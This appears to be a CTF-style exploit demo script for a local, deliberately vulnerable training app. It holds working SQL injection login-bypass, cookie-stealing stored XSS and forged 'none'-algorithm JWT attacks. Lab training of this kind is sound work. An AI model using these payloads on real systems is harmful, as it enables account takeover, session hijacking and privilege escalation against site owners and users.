import requests
import json
import base64
import hashlib
import time

BASE_URL = 'http://localhost:5001'

def exploit_sql_injection():
    print("\n1. SQL Injection Exploit (Authentication Bypass)")
    print("----------------------------------------------")
    # SQL Injection payload to get admin access
    payload = {
        'username': "' OR role='admin'--",
        'password': 'anything'
    }
    
    r = requests.post(f'{BASE_URL}/login', data=payload)
    if 'FLAG{SQL_M4st3r_Byp4ss_2025}' in r.text:
        print("✓ SQL Injection successful!")
        print("Flag found:", 'FLAG{SQL_M4st3r_Byp4ss_2025}')
    else:
        print("× SQL Injection failed")
        print("Response:", r.text[:200])

def exploit_stored_xss():
    print("\n2. Stored XSS Exploit (Cross-Site Scripting)")
    print("-------------------------------------------")
    
    # Create a session to maintain cookies
    session = requests.Session()
    
    # First register a new user
    username = f"attacker_{int(time.time())}"
    password = "test123"
    
    session.post(f'{BASE_URL}/register', data={
        'username': username,
        'password': password
    })
    
    # Login
    session.post(f'{BASE_URL}/login', data={
        'username': username,
        'password': password
    })
    
    # Create post with XSS payload that steals cookies
    xss_payload = '''
    <script>
    // This would steal the admin's cookie when they view the post
    fetch('/steal-cookie?cookie='+document.cookie);
    // Show the hidden XSS flag
    alert(document.getElementById("xss-flag").innerText);
    </script>
    '''
    
    params = {
        'action': 'post',
        'title': 'XSS Test',
        'content': xss_payload
    }
    
    # Create the post and follow redirects
    session.get(f'{BASE_URL}/dashboard', params=params, allow_redirects=True)
    
    # View the dashboard to see if our XSS payload worked
    r = session.get(f'{BASE_URL}/dashboard')
    if 'FLAG{XSS_St0r3d_Att4ck_2025}' in r.text:
        print("✓ XSS payload injected successfully!")
        print("Flag found:", 'FLAG{XSS_St0r3d_Att4ck_2025}')
        print("Note: In a real attack, the attacker would wait for an admin to view the post")
        print("      to steal their session cookie.")
    else:
        print("× XSS injection failed")

def exploit_jwt_none():
    print("\n3. JWT None Algorithm Exploit (Privilege Escalation)")
    print("------------------------------------------------")
    
    # Create a JWT token with 'none' algorithm
    header = {
        'alg': 'none',
        'typ': 'JWT'
    }
    payload = {
        'admin': True,
        'user': 'attacker'
    }
    
    # Encode header and payload
    header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
    payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # Create token with empty signature
    token = f"{header_b64}.{payload_b64}."
    
    # Try to access admin endpoint
    headers = {'Authorization': f'Bearer {token}'}
    r = requests.get(f'{BASE_URL}/api/secret', headers=headers)
    
    if 'FLAG{JWT_N0n3_Alg_Tr1ck_2025}' in r.text:
        print("✓ JWT None algorithm exploit successful!")
        print("Flag found:", 'FLAG{JWT_N0n3_Alg_Tr1ck_2025}')
        response = r.json()
        if 'secret' in response:
            print("Secret found:", response['secret'])
    else:
        print("× JWT None algorithm exploit failed")
        print("Response:", r.text)

if __name__ == "__main__":
    print("AWAS Project - Core Vulnerability Exploitation Demo")
    print("===============================================")
    print("This script demonstrates the three main vulnerabilities:")
    print("1. SQL Injection - Authentication Bypass")
    print("2. Stored XSS - Cross-Site Scripting Attack")
    print("3. JWT None Algorithm - Privilege Escalation")
    print("\nStarting exploitation...")
    
    try:
        exploit_sql_injection()
        exploit_stored_xss()
        exploit_jwt_none()
        
        print("\nAll exploits completed!")
        print("Try them manually in the browser for better understanding.")
        print("Remember to look for the hidden flags in the page source when successful.")
        
    except Exception as e:
        print(f"\nError during exploitation: {str(e)}")
        print("Make sure the application is running at", BASE_URL)